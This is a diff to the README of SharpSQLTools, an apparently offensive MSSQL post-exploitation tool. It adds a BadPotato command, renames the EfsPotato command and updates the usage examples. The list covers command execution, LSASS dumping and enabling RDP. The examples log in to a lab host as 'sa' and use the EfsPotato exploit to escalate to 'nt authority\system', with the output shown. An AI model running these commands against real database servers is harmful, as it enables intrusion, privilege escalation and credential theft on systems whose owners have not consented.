@@ -6,12 +6,16 @@
 
 ### 更新日志
 
+- 2021-08-05
+  - 添加clr_badpotato
+  - 修改原来的clr_potato为clr_efspotato
+
 - 2021-08-04
   - 添加一些clr实现的基本命令：pwd,ls,netstat,ps等等
   - 致谢[KevinJClark@csharptoolbox](https://gitlab.com/KevinJClark/csharptoolbox/-/tree/master/WindowsBinaryReplacements) & [rabbittb](https://github.com/rabbittb)
 
 - 2021-08-03
-  - 添加clr_potato
+  - 添加clr_efspotato
   - 致谢[zcgonvh@EfsPotato](https://github.com/zcgonvh/EfsPotato) & [hl0rey](https://github.com/hl0rey)
 
 - 2021-07-10 
@@ -73,7 +77,8 @@ clr_ping {host}            - ping by clr
 clr_cat {file}             - view file contents by clr
 clr_rm {file}              - delete file by clr
 clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
-clr_potato {cmd}           - exec by EfsPotato like clr_exec
+clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
+clr_badpotato {cmd}        - exec by BadPotato like clr_exec
 clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
 clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
@@ -148,10 +153,10 @@ nt service\mssql$sqlexpress
 
 ```
 
-#### clr_potato
+#### clr_efspotato or clr_badpotato
 
 ```
-λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_potato whoami
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato whoami
 [*] Database connection is successful!
 Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
 Part of GMH's fuck Tools, Code By zcgonvh.
@@ -165,7 +170,7 @@ Part of GMH's fuck Tools, Code By zcgonvh.
 
 nt authority\system
 
-λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_potato -p c:\windows/system32\whoami.exe
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato -p c:\windows/system32\whoami.exe
 [*] Database connection is successful!
 Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
 Part of GMH's fuck Tools, Code By zcgonvh.
@@ -179,7 +184,7 @@ Part of GMH's fuck Tools, Code By zcgonvh.
 
 nt authority\system
 
-λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_potato -p c:\cmd.exe -a /c whoami
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato -p c:\cmd.exe -a /c whoami
 [*] Database connection is successful!
 Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
 Part of GMH's fuck Tools, Code By zcgonvh.
